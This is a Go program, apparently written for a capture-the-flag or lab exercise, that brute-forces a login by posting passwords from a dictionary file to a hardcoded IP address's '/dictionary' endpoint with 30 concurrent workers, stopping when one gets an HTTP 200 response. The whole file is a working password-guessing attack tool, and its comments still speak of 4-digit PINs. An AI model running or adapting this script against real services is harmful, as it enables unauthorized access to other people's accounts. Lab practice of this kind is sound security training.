package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
)

const (
	ip         = "94.237.59.237:50595"
	maxWorkers = 30 // Number of concurrent goroutines
)

var (
	found      bool
	foundMutex sync.Mutex
)

func main() {
	pinChannel := make(chan string, maxWorkers)
	var wg sync.WaitGroup

	// Start worker goroutines
	startWorkers(&wg, pinChannel)

	// Generate and send PINs
	readDict(pinChannel)

	// Wait for all workers to finish
	wg.Wait()
}

// startWorkers starts a fixed number of goroutines to process PINs
func startWorkers(wg *sync.WaitGroup, pinChannel chan string) {
	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pin := range pinChannel {
				if tryPin(pin) {
					return
				}
			}
		}()
	}
}

// tryPin sends an HTTP GET request to test a specific PIN
func tryPin(pin string) bool {
	// Check if the correct PIN has already been found
	foundMutex.Lock()
	if found {
		foundMutex.Unlock()
		return true
	}
	foundMutex.Unlock()

	url := fmt.Sprintf("http://%s/dictionary", ip)
	data := map[string]string{"password": pin}
	jsonData, err := json.Marshal(data)
	if err != nil {
		log.Print(err)
	}

	req, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	log.Print(jsonData)
	if err != nil {
		log.Printf("Error trying password %s: %v", pin, err)
		return false
	}
	defer req.Body.Close()

	log.Printf("Password tried: %s", pin)

	log.Print(req.StatusCode)
	body, err := io.ReadAll(req.Body)
	if err != nil {
		log.Printf("Failed to read response body: %v", err)
	} else {
		fmt.Println("Request Body:", string(body))
	}

	if req.StatusCode == http.StatusOK {
		foundMutex.Lock()
		if !found {
			found = true
			log.Printf("Correct Password found: %s", pin)
			body, err := io.ReadAll(req.Body)
			if err != nil {
				log.Printf("Failed to read response body: %v", err)
			} else {
				fmt.Println("Request Body:", string(body))
			}
		}
		foundMutex.Unlock()
		return true
	}
	return false
}

// generatePins sends all possible 4-digit PINs to the pinChannel
func readDict(pinChannel chan string) {
	file, err := os.Open("dict.txt")
	if err != nil {
		log.Fatal(err)
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {

		pin := scanner.Text()
		foundMutex.Lock()
		if found {
			foundMutex.Unlock()
			break
		}
		foundMutex.Unlock()

		pinChannel <- pin
	}
	close(pinChannel)
}
